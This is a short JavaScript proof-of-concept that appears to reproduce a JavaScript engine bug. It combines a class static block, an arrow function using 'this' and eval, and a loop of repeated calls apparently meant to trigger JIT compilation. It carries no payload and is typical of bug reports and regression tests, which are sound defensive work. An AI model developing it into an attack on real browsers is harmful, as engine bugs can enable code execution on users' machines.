function poc() {
  class C {
    static {
      const f = () => {
        this;
        eval('');
      };
      f();
    }
  }
}

for (let i = 0; i < 200; i++) {
  poc.call(i);
}
poc.call({});